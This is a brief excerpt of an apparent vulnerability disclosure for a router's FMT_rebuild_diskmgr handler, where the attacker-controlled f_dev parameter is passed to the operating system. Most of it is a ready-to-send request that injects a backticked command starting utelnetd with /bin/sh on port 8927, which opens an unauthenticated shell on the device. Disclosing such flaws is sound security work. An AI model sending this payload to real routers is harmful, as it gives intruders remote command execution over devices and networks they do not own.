...
In `FMT_rebuild_diskmgr` function, `f_dev` is directly passed by the attacker, so we can control the `f_dev` to attack the OS.
...
We set `f_dev` as **`utelnetd -p 8927 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=FMT_rebuild_diskmgr&f_dev=`utelnetd -p 8927 -l /bin/sh`&f_raidlevel=&f_auto_sync=
```
